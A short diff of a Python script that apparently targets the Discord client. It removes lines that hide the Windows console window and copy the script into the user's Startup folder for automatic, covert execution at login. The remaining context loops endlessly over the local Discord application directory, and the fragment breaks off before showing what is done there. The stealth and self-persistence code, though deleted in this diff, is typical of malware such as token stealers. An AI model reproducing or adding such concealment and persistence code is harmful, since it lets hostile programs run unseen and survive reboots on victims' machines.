@@ -1,17 +1,8 @@
 import os
 import time
 import sys
-import shutil
 import ctypes
 
-if sys.platform == 'win32':
-    import win32gui, win32console, win32con
-    hwnd = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-
-current = os.path.abspath(__file__)
-startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-shutil.copy2(current, startup)
 while True:
     discpathuwu = os.path.join(os.getenv('LOCALAPPDATA'), 'Discord')
     for folder in os.listdir(discpathuwu):
